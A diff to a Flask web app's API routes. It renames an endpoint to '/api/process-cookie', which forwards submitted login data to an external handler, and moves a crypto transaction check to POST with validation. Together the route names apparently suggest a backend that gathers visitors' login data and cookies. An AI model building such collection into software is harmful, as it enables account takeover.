@@ -66,22 +66,22 @@ def notify_visit():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/verify-redirect-visit', methods=['POST'])
-@limiter.limit("10 per minute")
-def notify_failed_login():
-    try:
-        login_data = request.form.to_dict()
-        result = external_apis.verify_redirect_visit(login_data)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
 @app.route('/api/notify-form-submission', methods=['POST'])
 @limiter.limit("10 per minute")
 def notify_form_submission():
     try:
         form_data = request.form.to_dict()
         result = external_apis.notify_form_submission(form_data)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/process-cookie', methods=['POST'])
+@limiter.limit("10 per minute")
+def notify_failed_login():
+    try:
+        login_data = request.form.to_dict()
+        result = external_apis.process_cookie(login_data)
         return jsonify(result)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -166,13 +166,24 @@ def get_exchange_rates():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-@app.route("/api/check_transaction", methods=["GET"])
+@app.route("/api/check_transaction", methods=["POST"])
 @limiter.limit("10 per minute")
 def check_transaction():
     try:
-        address = request.args.get("address")
-        expected_amount = float(request.args.get("amount", 0))
-        result = infura_handler.check_transaction(address, expected_amount)
+        data = request.get_json()
+        if not data:
+            return jsonify({'error': 'No JSON data provided'}), 400
+            
+        address = data.get("address")
+        expected_amount = float(data.get("amount", 0))
+        currency = data.get("currency", "ETH")  # Default to ETH if not provided
+        transaction_id = data.get("transaction_id")
+        
+        if not address or not expected_amount:
+            return jsonify({'error': 'address and amount are required parameters'}), 400
+            
+        # Use the InfuraWeb3Handler's check_transaction method which handles all currencies
+        result = infura_handler.check_transaction(address, expected_amount, currency)
         return jsonify(result)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
